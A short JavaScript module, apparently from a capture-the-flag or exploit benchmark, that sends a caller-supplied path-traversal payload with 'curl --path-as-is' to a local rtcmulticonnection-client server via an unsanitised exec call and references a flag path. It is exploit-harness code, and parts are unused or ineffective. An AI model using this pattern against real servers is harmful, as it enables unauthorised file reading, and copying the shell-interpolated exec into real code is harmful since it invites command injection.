function exploitFunction(payload) {
  const { exec } = require("child_process");
  const pathToFlag = require("../utils/pathToFlag"); // Assuming pathToFlag is defined in utils
  const server = "node ./node_modules/rtcmulticonnection-client/server.js";
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${payload}"`;

  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error executing command: ${error}`);
      return;
    }
    return stdout; // Return the output for verification
  });
}

module.exports = { exploitFunction };